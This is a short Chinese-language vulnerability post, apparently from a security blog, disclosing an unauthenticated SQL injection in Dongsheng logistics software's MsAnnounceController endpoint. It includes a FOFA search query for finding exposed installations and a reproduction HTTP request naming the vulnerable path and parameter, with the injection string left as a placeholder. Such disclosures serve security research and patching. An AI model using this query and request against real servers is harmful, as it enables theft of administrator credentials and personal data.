#  【0day】东胜物流软件 MsAnnounceController SQL注入漏洞  
 0day收割机   2026-02-25 06:36  
  
# 漏洞简介  
  
东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 MsAnnounceController 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
# 影响版本  
# fofa语法  
> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"  
  
# 漏洞复现  
```
GET /MvcShipping/MsAnnounce/GetData?handle=edit&condition=SQLI_POC HTTP/1.1
Host: 
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBvyPCB0A1icVoZAzlx3wulyYjPTGo5bWCoiaIXHibD6UGQZcIHMB4lko2U10vl1gGNM0VzfQpkaiaLIeKPrgKlibY0yThB5HENJ1d0/640?wx_fmt=png&from=appmsg "")  
  
成功利用报错注入在响应里回显数据库版本信息  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
